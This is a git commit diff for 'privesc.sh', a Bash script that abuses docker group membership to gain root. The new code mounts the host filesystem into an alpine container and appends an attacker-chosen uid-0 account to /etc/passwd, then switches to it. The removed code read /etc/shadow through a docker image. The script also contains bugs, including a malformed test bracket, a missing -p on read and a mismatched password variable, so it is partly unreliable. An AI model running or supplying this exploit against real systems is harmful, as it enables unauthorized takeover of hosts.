dda286ab87ce37e83404f300cfb699b718ee13a2
flast101 <frederic.lastennet@gmail.com>
2020-08-08 21:29:37 +0200

    Update privesc.sh

--- privesc.sh
+++ privesc.sh
@@ -1,13 +1,30 @@
 #!/bin/bash
 
-if [ $(id -u) -eq 0 ]; then
-    echo "Already root"
-    exit
-fi
+test_docker=$(docker ps | grep 'CONTAINER ID' | cut -d " " -f 1-2)
 
-if groups $USER |grep -q docker; then
-    echo "User $USER in docker group, attacking..."
-    docker run -v /etc:/root krustyhack/docker-privesc cat /root/shadow
-else
-    echo "User $USER not in docker group, abort."
+if [$test_docker='CONTAINER ID']; then
+	echo 'Please write down your new root credentials.'
+    read -p 'Choose a root user name: ' rootname
+    read -s 'Choose a root password: ' passw1
+    read -p 'Choose the the salt to hash your password: ' salt
+    hpass=$(openssl passwd -1 -salt $salt $passw)
+
+    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
+    mv new_account /tmp/new_account
+    docker run -tid -v /:/mnt/ --name flast101 alpine # CHANGE THIS IF NEEDED
+    sleep 1; echo 'Please wait...'; sleep 1; echo '...'; sleep 1; echo '...';
+    docker exec -ti flast101 sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
+    sleep 1
+    
+    echo 'Success! Enter you password to use your root account:'
+    rm /tmp/new_account
+    su $rootname
+
+elif [ $(id -u) -eq 0 ]; then
+    echo "The user islready root. Have fun ;-)"
+    exit
+
+else echo "Your account does not have permission to execute docker, aborting..."
+	exit
+
 fi
